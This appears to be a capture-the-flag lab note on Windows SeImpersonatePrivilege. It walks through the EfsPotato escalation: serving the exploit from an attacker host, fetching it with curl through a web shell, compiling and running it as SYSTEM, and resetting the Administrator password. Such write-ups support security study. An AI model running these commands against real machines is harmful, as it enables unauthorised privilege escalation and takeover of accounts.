`SeImpersonatePrivilege` is a **Windows security privilege** that allows a process to **impersonate another user's access token** after the user has authenticated.

In simple terms:

- If a process has this privilege, it can **act on behalf of another user** on the system.
- This is critical because it can be abused to **escalate privileges** (for example, from a normal user to `SYSTEM`) when combined with token-stealing techniques or Potato-family attacks (Juicy Potato, PrintSpoofer, RoguePotato, etc.).

### Technical details:

- Internal name: `SeImpersonatePrivilege`
- It's granted by default to services and applications that need to act on behalf of other users (for example, IIS, SQL Server, etc.).
- It appears in `whoami /priv` if you have it enabled.

### Typical exploitation flow

1. The attacker gains access with a low-privilege user.
2. They discover they have the `SeImpersonatePrivilege`.
3. They use techniques like [**_PrintSpoofer_**](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) or  [**_SweetPotato_**](https://github.com/CCob/SweetPotato) to execute commands as `NT AUTHORITY\SYSTEM`.

### EfsPotato

#Attacking_machine 
- Download from [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato) the file `EfsPotato.cs`.
    
- Open a python HTTP server in the folder you have the files.
    

```
python3 -m http.server 80
```

#p0wny-shell 

- Run the following code to download the files to the user's desktop.

```
evader@HostEvasion:C:\xampp\htdocs# curl http://<ATTACKING MACHINE IP>:80/EfsPotato.cs -o ef.cs
```

- Compile the file `ef.cs`.

```
evader@HostEvasion:C:\xampp\htdocs# C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe ef.cs -nowarn:1691,618
```

- Run thee `ef.exe` program with a command.

```
evader@HostEvasion:C:\xampp\htdocs# ef whoami
```

![[Screenshot_2025-11-02_14-37-28.png]]

You are administrator.

- Change `Adminstrator's` password.

```
ef "cmd /C net user administrator Password123#
```

![[Screenshot_2025-11-02_14-44-48.png]]

**Next step:** [[Root flag]]
